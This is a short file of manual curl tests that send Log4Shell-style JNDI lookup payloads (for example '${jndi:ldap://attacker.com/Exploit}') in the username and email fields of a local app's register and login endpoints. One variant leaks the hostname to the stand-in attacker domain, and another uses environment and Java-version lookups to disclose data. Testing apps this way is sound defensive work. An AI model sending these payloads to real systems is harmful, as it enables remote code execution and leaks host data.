# Manual tests with curl

# Test 1: Registration with existing username and JNDI payload in email
curl -X POST http://localhost:8080/register \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","email":"${jndi:ldap://attacker.com/Exploit}","password":"password123"}'

# Test 2: Invalid email with payload in username  
curl -X POST http://localhost:8080/register \
  -H "Content-Type: application/json" \
  -d '{"username":"${jndi:ldap://attacker.com/Exploit}","email":"notanemail","password":"test123"}'

# Test 3: Password too short
curl -X POST http://localhost:8080/register \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","email":"${jndi:ldap://attacker.com/Exploit}","password":"123"}'

# Test 4: Failed login with non-existent user
curl -X POST http://localhost:8080/login \
  -H "Content-Type: application/json" \
  -d '{"username":"${jndi:ldap://attacker.com/Exploit}","password":"anything"}'

# Test 5: Obfuscated payload with environment variables
curl -X POST http://localhost:8080/register \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","email":"${jndi:ldap://${env:HOSTNAME}.attacker.com/Exploit}","password":"test"}'

# Test 6: Info disclosure with lookups
curl -X POST http://localhost:8080/register \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","email":"java-${java:version}-user-${env:USER}@test.com","password":"test123"}'
